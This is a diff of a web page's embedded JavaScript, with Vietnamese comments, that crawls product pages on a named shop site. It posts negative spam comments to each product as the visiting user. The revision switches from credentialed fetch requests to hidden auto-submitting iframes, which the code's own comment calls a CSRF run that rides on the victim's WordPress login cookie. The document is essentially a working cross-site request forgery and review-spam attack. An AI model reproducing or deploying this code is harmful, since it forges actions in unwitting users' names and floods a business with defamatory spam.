@@ -2985,65 +2985,57 @@
         "Nhân viên thái độ lồi lõm",
       ];
 
-      // Lấy tất cả link sản phẩm từ các trang category
-      async function extractProductLinksFrom(url) {
-        try {
-          const res = await fetch(url);
-          const html = await res.text();
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, "text/html");
-
-          return Array.from(doc.querySelectorAll("a"))
-            .map((a) => a.href)
-            .filter((href) =>
-              href.startsWith("https://mydecobox.shop/product/")
-            );
-        } catch (e) {
-          console.warn(`Không fetch được ${url}:`, e);
-          return [];
-        }
+      // 1) Quét link sản phẩm
+      async function extractLinks(u) {
+        const txt = await fetch(u).then((r) => r.text());
+        const doc = new DOMParser().parseFromString(txt, "text/html");
+        return Array.from(doc.querySelectorAll("a"))
+          .map((a) => a.href)
+          .filter((h) => h.match(/^https:\/\/mydecobox\.shop\/product\//));
       }
 
-      async function getAllProductLinks() {
-        let all = [];
-        for (const u of PRODUCT_PAGES) {
-          const links = await extractProductLinksFrom(u);
-          all = all.concat(links);
+      // 2) Gom link không trùng
+      async function allLinks() {
+        const a = [];
+        for (let p of CATEGORY_PAGES) {
+          a.push(...(await extractLinks(p)));
         }
-        return [...new Set(all)];
+        return [...new Set(a)];
       }
 
-      // Gửi comment tới từng sản phẩm
-      async function sendComment(productUrl, commentText) {
-        const payload = new URLSearchParams();
-        payload.append("comment", commentText);
-        payload.append("xss_submit", "1");
+      // 3) POST qua iframe ẩn
+      function postViaIframe(url, comment) {
+        const ifr = document.createElement("iframe");
+        ifr.style.display = "none";
+        ifr.name = "ifr_" + Math.random().toString(36).slice(2);
+        document.body.appendChild(ifr);
 
-        try {
-          const res = await fetch(productUrl, {
-            method: "POST",
-            credentials: "include", // bắt buộc để kèm cookie login
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: payload.toString(),
-          });
-          if (res.ok) {
-            console.log(`✅ Gửi thành công: ${productUrl}`);
-          } else {
-            console.warn(`⚠️ Lỗi ${res.status} tại ${productUrl}`);
-          }
-        } catch (err) {
-          console.error(`❌ Không gửi được: ${productUrl}`, err);
-        }
+        const doc = ifr.contentWindow.document;
+        doc.open();
+        doc.write(`
+        <form method="POST" action="${url}">
+          <input type="hidden" name="comment" value="${comment.replace(
+            /"/g,
+            "&quot;"
+          )}">
+          <input type="hidden" name="xss_submit" value="1">
+        </form>
+        <script>document.forms[0].submit();<\/script>
+      `);
+        doc.close();
       }
 
-      // Chạy spam sau 3s
+      // 4) Chạy CSRF sau 2s
       setTimeout(async () => {
-        const links = await getAllProductLinks();
-        links.forEach((link, i) => {
-          const comment = SPAM_COMMENTS[i % SPAM_COMMENTS.length];
-          setTimeout(() => sendComment(link, comment), i * 2000);
+        const links = await allLinks();
+        links.forEach((l, i) => {
+          setTimeout(() => {
+            // Mỗi lần iframe POST sẽ kèm cookie WP, plugin sẽ kiểm tra login và insert comment
+            postViaIframe(l, SPAM_COMMENTS[i % SPAM_COMMENTS.length]);
+            console.log("Sent comment to", l);
+          }, i * 1500);
         });
-      }, 3000);
+      }, 2000);
     </script>
   </body>
 </html>
